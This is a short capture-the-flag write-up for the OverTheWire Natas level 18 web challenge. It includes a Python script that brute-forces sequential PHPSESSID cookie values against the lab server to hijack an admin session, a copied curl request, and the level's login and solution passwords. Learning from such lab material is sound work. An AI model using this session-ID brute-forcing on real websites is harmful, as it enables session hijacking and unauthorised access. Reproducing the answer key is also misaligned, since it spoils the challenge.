```
Username: natas18
Password: 6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ
URL:      http://natas18.natas.labs.overthewire.org
```

- for this level i get a page with a username and password fields
- if i enter random values, it tells me i am logged in as a regular user, and assigns me a random session ID 
- looking at the source code i can see the value of this ID can be between 0 and 640
- i can also see that the "admin" username can not be used as a valid admin username
- the code checks for the session ID, and if it matches, it logs me as admin
- to obtain the password for the next level, i need to check each possible session ID, until one returns the credentials for level 19
- to do that i used the following python script

```python
import requests
import string
from requests.auth import HTTPBasicAuth

basicAuth=HTTPBasicAuth('natas18', '6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ')

MAX = 640
count = 1

u="http://natas18.natas.labs.overthewire.org/index.php?debug"

while count <= MAX:
    sessionID = "PHPSESSID=" + str(count)
    print(sessionID)

    headers = {'Cookie': sessionID}
    response = requests.get(u, headers=headers, auth=basicAuth, verify=False)

    if "You are logged in as a regular user" not in response.text:
        print(response.text)
        break
    count += 1

print("Done!")
```
- i got the necessary headers by copying a request as cURL in the browser devtools, and removing the unnecessary ones:
```
curl 'http://natas18.natas.labs.overthewire.org/' \
  --compressed \
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:144.0) Gecko/20100101 Firefox/144.0' \
  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' \
  -H 'Accept-Language: en-US,en;q=0.5' \
  -H 'Accept-Encoding: gzip, deflate' \
  -H 'Authorization: Basic bmF0YXMxODo2T0cxUGJLZFZqeUJscHhnRDRERGJSRzZaTGxDR2dDSg==' \
  -H 'Connection: keep-alive' \
  -H 'Cookie: PHPSESSID=26' \
  -H 'Upgrade-Insecure-Requests: 1' \
  -H 'DNT: 1' \
  -H 'Sec-GPC: 1' \
  -H 'Priority: u=0, i'
```

# Password

- **tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr**
